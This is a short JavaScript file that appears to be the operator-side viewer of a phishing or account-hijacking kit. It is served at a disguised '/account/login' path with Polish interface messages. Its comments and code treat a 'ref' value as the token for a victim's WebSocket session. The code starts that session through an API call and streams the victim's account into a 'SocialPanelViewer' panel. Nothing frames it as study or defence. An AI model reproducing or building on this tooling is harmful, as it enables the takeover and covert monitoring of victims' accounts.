// Viewer page — loaded at /account/login?ref=<numeric-ref>
// The ref serves as the access token for the victim's WebSocket connection.
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

let _ready = false;
viewer.onReady = () => { _ready = true; if (overlay) overlay.classList.add('hidden'); };
viewer.onclose = (ev) => {
  if (!_ready) fail(`Błąd połączenia (${ev.code || 'WS closed'}).`);
};

if (!ref) { fail('Brak ref. Wróć do panelu.'); }
else {
  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
    method: 'POST',
    credentials: 'same-origin',
  })
    .then(async (res) => {
      if (res.status === 404) { fail('Nieznany link.'); return; }
      const { accountId } = await res.json();
      // Pass ref so the WebSocket authenticates via the unguessable ref token.
      viewer.connect(accountId, ref);
    })
    .catch(() => fail('Błąd połączenia.'));
}
